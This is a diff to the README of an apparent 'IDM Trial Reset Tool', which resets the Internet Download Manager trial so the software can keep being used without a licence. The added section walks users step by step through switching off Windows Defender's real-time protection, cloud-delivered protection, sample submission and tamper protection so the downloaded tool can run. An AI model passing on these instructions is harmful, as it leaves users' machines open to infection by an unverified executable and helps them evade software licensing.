@@ -41,8 +41,46 @@ Once the file is downloaded, follow these steps to unzip it:
 
 ## Important Notes:
 
-- Ensure that your antivirus software allows the tool to run, as it may be flagged by some antivirus programs.
-- You can repeat this process whenever the IDM trial expires to reset it again.
+### Ensure Tool Functionality
+
+1. **Check Antivirus Settings**: Make sure your antivirus software allows the IDM Trial Reset Tool to run, as it may be flagged by some programs.
+
+### If Your Antivirus Blocks the Tool:
+
+1. **Open Windows Settings**:
+
+   - Press `Windows + I` to open the Settings menu.
+
+2. **Go to Update & Security**:
+
+   - Click on **Update & Security**.
+
+3. **Access Windows Security**:
+
+   - Select **Windows Security** from the left-hand menu.
+
+4. **Open Virus & Threat Protection**:
+
+   - Click on **Virus & threat protection**.
+
+5. **Manage Settings**:
+
+   - Scroll down and click on **Manage settings** under the "Virus & threat protection settings" section.
+
+6. **Turn Off Active Protection**:
+
+   - Toggle off the following settings:
+     - Real-time protection
+     - Cloud-delivered protection
+     - Automatic sample submission
+     - Tamper protection
+
+7. **Complete the IDM Trial Reset**:
+
+   - Run the **IDM Trial Reset Tool** to reset your trial period.
+
+8. **Re-enable Active Protection**:
+   - After the reset is complete, return to the same settings and turn on all previously disabled protective settings to ensure your system remains secure.
 
 ---
 
